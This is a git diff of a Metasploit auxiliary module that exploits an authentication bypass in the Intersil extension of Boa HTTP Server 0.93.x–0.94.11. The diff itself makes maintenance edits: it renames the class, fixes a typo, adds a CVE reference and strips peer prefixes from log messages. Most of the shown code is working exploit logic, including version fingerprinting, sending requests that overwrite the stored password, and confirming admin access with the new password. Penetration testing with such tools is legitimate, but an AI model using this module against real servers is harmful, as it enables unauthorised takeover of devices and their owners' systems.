@@ -1,19 +1,16 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
       'Name'          => 'Intersil (Boa) HTTPd Basic Authentication Password Reset',
       'Description'   => %q{
-          The Intersil extention in the Boa HTTP Server 0.93.x - 0.94.11
+          The Intersil extension in the Boa HTTP Server 0.93.x - 0.94.11
           allows basic authentication bypass when the user string is greater
           than 127 bytes long.  The long string causes the password to be
           overwritten in memory, which enables the attacker to reset the
@@ -32,8 +29,9 @@ class Metasploit3 < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'References'     =>
         [
+          [ 'CVE', '2007-4915' ],
           [ 'BID', '25676'],
-          [ 'URL', 'http://packetstormsecurity.org/files/59347/boa-bypass.txt.html']
+          [ 'PACKETSTORM', '59347']
         ],
       'DisclosureDate' => 'Sep 10 2007'))
 
@@ -41,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptString.new('TARGETURI', [ true,  "The request URI", '/']),
         OptString.new('PASSWORD', [true, 'The password to set', 'pass'])
-      ], self.class)
+      ])
   end
 
   def check
@@ -52,17 +50,17 @@ class Metasploit3 < Msf::Auxiliary
       })
 
       if (res and (m = res.headers['Server'].match(/Boa\/(.*)/)))
-        vprint_status("#{peer} - Boa Version Detected: #{m[1]}")
+        vprint_status("Boa Version Detected: #{m[1]}")
         return Exploit::CheckCode::Safe if (m[1][0].ord-48>0) # boa server wrong version
         return Exploit::CheckCode::Safe if (m[1][3].ord-48>4)
         return Exploit::CheckCode::Vulnerable
       else
-        vprint_status("#{peer} - Not a Boa Server!")
+        vprint_status("Not a Boa Server!")
         return Exploit::CheckCode::Safe # not a boa server
       end
 
     rescue Rex::ConnectionRefused
-      print_error("#{peer} - Connection refused by server.")
+      print_error("Connection refused by server.")
       return Exploit::CheckCode::Safe
     end
   end
@@ -80,14 +78,14 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res.nil?
-      print_error("#{peer} - The server may be down")
+      print_error("The server may be down")
       return
     elsif res and res.code != 401
-      print_status("#{peer} - #{uri} does not have basic authentication enabled")
+      print_status("#{uri} does not have basic authentication enabled")
       return
     end
 
-    print_status("#{peer} - Server still operational. Checking to see if password has been overwritten")
+    print_status("Server still operational. Checking to see if password has been overwritten")
     res = send_request_cgi({
       'uri'   => uri,
       'method'=> 'GET',
@@ -95,17 +93,17 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if not res
-      print_error("#{peer} - Server timedout, will not continue")
+      print_error("Server timedout, will not continue")
       return
     end
 
     case res.code
     when 200
-      print_good("#{peer} - Password reset successful with admin:#{datastore['PASSWORD']}")
+      print_good("Password reset successful with admin:#{datastore['PASSWORD']}")
     when 401
-      print_error("#{peer} - Access forbidden. The password reset attempt did not work")
+      print_error("Access forbidden. The password reset attempt did not work")
     else
-      print_status("#{peer} - Unexpected response: Code #{res.code} encountered")
+      print_status("Unexpected response: Code #{res.code} encountered")
     end
 
   end
